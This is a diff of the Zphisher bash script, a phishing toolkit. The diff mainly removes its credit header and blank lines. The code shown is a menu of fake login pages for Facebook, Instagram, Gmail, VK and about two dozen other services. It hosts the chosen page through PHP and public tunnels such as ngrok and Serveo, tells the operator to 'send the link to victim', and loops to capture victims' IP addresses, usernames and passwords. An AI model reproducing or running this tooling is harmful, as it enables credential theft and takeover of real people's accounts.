@@ -1,25 +1,11 @@
-# Zphisher V_2.0
-# ==============================================
-# Created By HTR-TECH @tahmid.rayat
-# Instagram : https://instagram.com/tahmid.rayat
-# Github : https://github.com/htr-tech/
-# ==============================================
-# Script Credit thelinuxchoice (github.com/thelinuxchoice)
-# Some Phishing Pages are Created by thelinuxchoice (github.com/thelinuxchoice) & DarkSecDevlopers (github.com/DarkSecDevlopers)
-#!/bin/bash
-
 trap 'printf "\n";stop;exit 1' 2
-
 deps() {
-
 command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed ! Install it."; exit 1; }
 command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is not installed ! Install it."; exit 1; }
 command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Install it"; exit 1; }
 command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
-
-}    
+}
 banner() {
-
 clear
 printf " \e[33;1m ______      _     _     _               \e[0m\n"
 printf " \e[33;1m|___  /     | |   (_)   | |              \e[0m\n"
@@ -34,10 +20,8 @@ printf " \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by htr-tech (tahmid.r
 printf " \n"
 printf " \e[36;1m.:.Select Any Attack for your Victim.:.\e[0m\n"
 printf " \n"
-
 }
 menu() {
-
 printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Facebook    \e[0m\e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[1;93m Twitch      \e[0m\e[1;31m[\e[0m\e[1;77m21\e[0m\e[1;31m]\e[0m\e[1;93m DeviantArt\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Instagram   \e[0m\e[1;31m[\e[0m\e[1;77m12\e[0m\e[1;31m]\e[0m\e[1;93m Pinterest   \e[0m\e[1;31m[\e[0m\e[1;77m22\e[0m\e[1;31m]\e[0m\e[1;93m Badoo\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Google      \e[0m\e[1;31m[\e[0m\e[1;77m13\e[0m\e[1;31m]\e[0m\e[1;93m Snapchat    \e[0m\e[1;31m[\e[0m\e[1;77m23\e[0m\e[1;31m]\e[0m\e[1;93m Origin\e[0m\n"
@@ -50,8 +34,6 @@ printf " \e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;93m Playstation \e[0m\e
 printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;93m Github      \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[1;93m Adobe       \e[0m\e[1;31m[\e[0m\e[1;77mx\e[0m\e[1;31m] \e[0m\e[1;93mExit\e[0m\n"
 printf "\e[0m\n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
-
-
 if [[ $option == 1 || $option == 01 ]]; then
 facebook
 elif [[ $option == 2 || $option == 02 ]]; then
@@ -137,16 +119,13 @@ elif [[ $option == 29 ]]; then
 vk
 elif [[ $option == X || $option == x ]]; then
 exit 1
-
 else
 printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
 sleep 1
 banner
 menu
 fi
-
 }
-
 facebook(){
 printf " \n"
 printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
@@ -155,8 +134,6 @@ printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security Login
 printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Messenger Login Page\e[0m\n"
 printf "\e[0m\n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
-
-
 if [[ $option == 1 || $option == 01 ]]; then
 server="facebook"
 start
@@ -169,14 +146,12 @@ start
 elif [[ $option == 4 || $option == 04 ]]; then
 server="fb_messenger"
 start
-
 else
 printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
 sleep 1
 banner
 menu
 fi
-
 }
 instagram(){
 printf " \n"
@@ -185,8 +160,6 @@ printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Auto Followers Logi
 printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Blue Badge Verify Login Page\e[0m\n"
 printf "\e[0m\n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
-
-
 if [[ $option == 1 || $option == 01 ]]; then
 server="instagram"
 start
@@ -196,14 +169,12 @@ start
 elif [[ $option == 3 || $option == 03 ]]; then
 server="ig_verify"
 start
-
 else
 printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
 sleep 1
 banner
 menu
 fi
-
 }
 gmail(){
 printf " \n"
@@ -212,8 +183,6 @@ printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Gmail New Login Pag
 printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll\e[0m\n"
 printf "\e[0m\n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
-
-
 if [[ $option == 1 || $option == 01 ]]; then
 server="google"
 start
@@ -223,14 +192,12 @@ start
 elif [[ $option == 3 || $option == 03 ]]; then
 server="google_poll"
 start
-
 else
 printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
 sleep 1
 banner
 menu
 fi
-
 }
 vk(){
 printf " \n"
@@ -238,25 +205,20 @@ printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login P
 printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
 printf "\e[0m\n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
-
-
 if [[ $option == 1 || $option == 01 ]]; then
 server="vk"
 start
 elif [[ $option == 2 || $option == 02 ]]; then
 server="vk_poll"
 start
-
 else
 printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
 sleep 1
 banner
 menu
 fi
-
 }
 stop() {
-
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checkssh=$(ps aux | grep -o "ssh" | head -n1)
@@ -275,13 +237,11 @@ fi
 if [[ -e linksender ]]; then
 rm -rf linksender
 fi
-
 }
 start() {
 if [[ -e linksender ]]; then
 rm -rf linksender
 fi
-
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m LocalHost\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Ngrok.io\e[0m\n"
@@ -305,31 +265,25 @@ sleep 1
 banner
 start
 fi
-
 }
 start_s() {
 if [[ -e websites/$server/ip.txt ]]; then
 rm -rf websites/$server/ip.txt
-
 fi
 if [[ -e websites/$server/usernames.txt ]]; then
 rm -rf websites/$server/usernames.txt
-
 fi
-
 def_port="5555"
 printf "\e[0m\n"
 printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
 read port
 port="${port:-${def_port}}"
 start_serveo
-
 }
-
 start_serveo() {
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
-cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
+cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
 sleep 2
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ..\e[0m\n"
@@ -344,20 +298,14 @@ printf "\n"
 printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $send_url
 printf "\n"
 found
-
 }
 start_n() {
 if [[ -e websites/$server/ip.txt ]]; then
 rm -rf websites/$server/ip.txt
-
 fi
 if [[ -e websites/$server/usernames.txt ]]; then
 rm -rf websites/$server/usernames.txt
-
 fi
-
-
-
 if [[ -e ngrok ]]; then
 echo ""
 else
@@ -367,7 +315,6 @@ arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
 curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-
 if [[ -e ngrok-stable-linux-arm.zip ]]; then
 unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
@@ -376,11 +323,8 @@ else
 printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
 exit 1
 fi
-
-
-
 else
-curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
 if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
@@ -391,19 +335,16 @@ exit 1
 fi
 fi
 fi
-
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ..\e[0m\n"
-cd websites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+cd websites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 2
 ./ngrok http 5555 > /dev/null 2>&1 &
 sleep 10
-
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
 found
 }
-
 start_local(){
 def_port="5555"
 printf "\e[0m\n"
@@ -412,7 +353,7 @@ read port
 port="${port:-${def_port}}"
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
-cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
+cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
 sleep 2
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ..\e[0m\n"
@@ -427,8 +368,6 @@ printf "\e[0m\n"
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Login Info..\e[0m\n"
 while [ true ]; do
-
-
 if [[ -e "websites/$server/ip.txt" ]]; then
 c_ip
 rm -rf websites/$server/ip.txt
@@ -448,9 +387,7 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to ex
 rm -rf websites/$server/usernames.txt
 fi
 sleep 0.75
-
 done
-
 }
 start_l() {
 def_port="5555"
@@ -460,22 +397,18 @@ read port
 port="${port:-${def_port}}"
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
-cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
+cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
 sleep 2
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://localhost:$port\e[0m\n"
 printf "\n"
 found
-
 }
 found() {
-
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
 printf "\n"
 while [ true ]; do
-
-
 if [[ -e "websites/$server/ip.txt" ]]; then
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found!\n"
@@ -491,10 +424,7 @@ c_cred
 rm -rf websites/$server/usernames.txt
 fi
 sleep 0.75
-
-
-done 
-
+done
 }
 c_ip() {
 touch websites/$server/login_info.txt
@@ -506,11 +436,8 @@ printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/victim_ip.txt\e[0m\n" $server
 printf "\n"
 cat websites/$server/ip.txt >> websites/$server/victim_ip.txt
-
 }
-
 c_cred() {
-
 account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' websites/$server/usernames.txt | cut -d ":" -f2)
@@ -521,9 +448,7 @@ printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/login_info.txt\e[0m\n" $server
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
-
 }
-
 banner
 deps
 menu
